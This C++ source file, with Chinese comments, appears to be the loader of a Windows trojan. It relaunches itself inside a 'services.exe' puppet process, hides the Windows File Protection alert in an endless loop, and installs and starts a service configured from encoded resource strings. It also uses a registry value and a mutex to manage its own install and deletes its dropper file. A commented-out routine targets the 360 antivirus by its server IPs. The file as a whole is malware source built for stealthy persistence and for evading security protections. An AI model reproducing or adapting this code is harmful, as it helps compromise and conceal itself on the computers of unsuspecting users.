// App_Loader.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "MyCommon.h"
#include "LoadExe.h"


#define	MY_WM_LOADEXE	0x804
#define	MY_WM_CLOSEWFP	0x805
#define	MY_WM_STOP360	0x806
#define	MY_WM_INSTALL	0x807

HWND hWnd = NULL;//窗口句柄
TCHAR *szWindowClass = _T("MyTestApp");

DWORD WINAPI DoSomeThing(LPVOID lparam)
{
	Sleep(1500);
	if (hWnd)
	{
		if ( MyCommon::GetAddr() )
		{
			SendMessage( hWnd, MY_WM_LOADEXE, NULL, NULL );
		}
		else
		{
			SendMessage( hWnd, WM_DESTROY, NULL, NULL );
		}
	}
	return 0;
}

DWORD WINAPI STOP_360(LPVOID lparam)
{
	Sleep(5000);//防止是更新，没有等待原服务端卸载
/*
	DWORD Pid_360 = MyCommon::GetProcessID( _T("360Tray.exe") );
	TCHAR FilePath[MAX_PATH];
	GetModuleFileName( NULL, FilePath, MAX_PATH );
	if ( wcsstr( FilePath, _T("\\services.exe") ) == NULL )//不在傀儡进程中
	{
		if ( Pid_360 != 0 )
		{
			int i = 0;
			MyCommon::Stop360("125.39.100.73",i++);
			MyCommon::Stop360("221.194.134.38",i++);
			MyCommon::Stop360("125.46.1.227",i++);
			MyCommon::Stop360("125.211.198.240",i++);
			MyCommon::Stop360("125.211.198.237",i++);
			char ips[30];
			int iii = 0;
			for ( iii = 0; iii <= 255; iii++ )
			{
				wsprintfA( ips, "124.238.254.%d", iii );
				MyCommon::Stop360(ips,i++);
			}
		}
	}
*/
	SendMessage( hWnd, MY_WM_CLOSEWFP, NULL, NULL );
	return 0;
}

DWORD WINAPI LOAD_EXE(LPVOID lparam)
{
	//ANSI
	CHAR FilePath[MAX_PATH];
	GetModuleFileNameA( NULL, FilePath, MAX_PATH );
	if ( strstr( FilePath, "\\services.exe" ) == NULL )//不在傀儡进程中
	{
		HKEY hKey = NULL;
		RegOpenKeyEx( HKEY_CURRENT_USER, _T("Console"), 0, KEY_READ|KEY_WRITE, &hKey );
		RegSetValueEx( hKey, _T("FuckYou"), 0, REG_SZ, (LPBYTE)MyCommon::ANSI2UNICODE(FilePath), lstrlen(MyCommon::ANSI2UNICODE(FilePath)) * sizeof(TCHAR) );
		RegCloseKey(hKey);
		ShowWindow( hWnd, SW_SHOWNORMAL );
		LoadExe(FilePath);
		SendMessage( hWnd, WM_DESTROY, NULL, NULL );
	}
	else
	{
		SendMessage( hWnd, MY_WM_STOP360, NULL, NULL );
	}

	return 0;
}

DWORD WINAPI Close_WFP(LPVOID lparam)
{
	HWND hWFP;
	Sleep(100);
	SendMessage( hWnd, MY_WM_INSTALL, NULL, NULL );
	while(1)
	{
		hWFP = FindWindow( NULL, _T("Windows 文件保护") );
		if (hWFP)
		{
			ShowWindow( hWFP,SW_HIDE );
		}
		Sleep(500);
	}
}

void EndOfPro(UINT result)
{
	SendMessage( hWnd, WM_DESTROY, NULL, NULL );
}

DWORD WINAPI MY_INSTALL(LPVOID lparam)
{
//	MessageBox( NULL, L"MY_INSTALL", L"", NULL );
	BOOL bDelete = FALSE;
	char *pos = NULL;
	char *lpEncodeString = (char*)MyCommon::FindConfigString( IDR_ENCODE, _T("InFormation") );
	if (!lpEncodeString) EndOfPro(-2);
	HANDLE	hMutex = CreateMutexA(NULL, true, lpEncodeString);
	DWORD	dwLastError = GetLastError();
	if (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED) EndOfPro(-2);
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	lstrcpyA( MyCommon::EncodeString, lpEncodeString );
	char *lpServiceConfig = (char*)MyCommon::FindConfigString( IDR_CONFIG, _T("InFormation") );
	if (!lpServiceConfig) EndOfPro(-1);
	pos = strstr( lpServiceConfig, "()" );
	if (pos)
	{
		*pos = '\0';
		bDelete = TRUE;
	}
	lstrcpyA( MyCommon::ServiceConfig, lpServiceConfig );
	pos = strchr( MyCommon::ServiceConfig, '|' );
	if (!pos) EndOfPro(0);
	*pos = '\0';
	char *lpServiceDisplayName = MyCommon::MyDecode( (char*)MyCommon::ServiceConfig );
	if (!lpServiceDisplayName) EndOfPro(-1);
	char *lpServiceDescription = MyCommon::MyDecode(pos + 1);
	if (!lpServiceDescription) EndOfPro(-2);
//	SetUnhandledExceptionFilter(bad_exception);
	TCHAR *InstallServiceName = (TCHAR*)MyCommon::InstallService( MyCommon::ANSI2UNICODE(lpServiceDisplayName), MyCommon::ANSI2UNICODE(lpServiceDescription), MyCommon::EncodeString, hWnd );
	if (InstallServiceName)
	{
		MyCommon::StartService(InstallServiceName);
	}

	HKEY hKey = NULL;
	TCHAR Buffer[MAX_PATH];
	DWORD type, size = sizeof(Buffer)/sizeof(TCHAR);
	RegOpenKeyEx( HKEY_CURRENT_USER, _T("Console"), 0, KEY_READ|KEY_WRITE, &hKey );
	RegQueryValueEx( hKey, _T("FuckYou"), 0, &type, (LPBYTE)Buffer, &size );
//	MessageBox( NULL, Buffer, L"", NULL );
	RegDeleteValue( hKey, _T("FuckYou") );
	RegCloseKey(hKey);
	if (bDelete) DeleteFile(Buffer);
	ShowWindow( hWnd, SW_HIDE );
	Sleep(10000);
	EndOfPro(0);

	return 0;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_DESTROY:
/*
		{
			for ( int i = 0; MyCommon::IpContext[i] != 0; i++ )
			{
				MyCommon::MyDeleteIPAddress(MyCommon::IpContext[i]);
			}
		}
*/
		ExitProcess(0);
//		PostQuitMessage(wParam);
		break;
	case MY_WM_STOP360:
		CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)STOP_360, NULL, 0, NULL );
		break;
	case MY_WM_LOADEXE:
		CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)LOAD_EXE, NULL, 0, NULL );
		break;
	case MY_WM_CLOSEWFP:
		CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)Close_WFP, NULL, 0, NULL );
		break;
	case MY_WM_INSTALL:
		CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)MY_INSTALL, NULL, 0, NULL );
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	HINSTANCE SelfHin = GetModuleHandle(NULL);
	MSG msg;
	WNDCLASSEX wcex;
	CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)DoSomeThing, NULL, 0, NULL );
	Sleep(500);
	memset( &wcex, 0, sizeof(WNDCLASSEX) );
	wcex.cbSize			= sizeof(WNDCLASSEX);
	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= (WNDPROC)WndProc;
	wcex.hInstance		= SelfHin;
	wcex.hIcon			= LoadIcon( NULL, IDI_WINLOGO );
	wcex.hCursor		= LoadCursor( NULL, IDC_ARROW );
	wcex.hbrBackground	= (HBRUSH)COLOR_WINDOW;
	wcex.lpszClassName	= szWindowClass;
	RegisterClassEx(&wcex);

	hWnd = CreateWindow( szWindowClass, _T(""), WS_OVERLAPPEDWINDOW, 0, 0, 200, 200, NULL, NULL, SelfHin, NULL);

	if (hWnd)
	{
//		ShowWindow(hWnd, SW_SHOWNORMAL );
		ShowWindow(hWnd, SW_HIDE );
		UpdateWindow(hWnd);
//		SendMessage( hWnd, WM_SYSCOMMAND, SC_MINIMIZE, NULL );
		while (GetMessage(&msg, NULL, 0, 0)) 
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return 0;
}
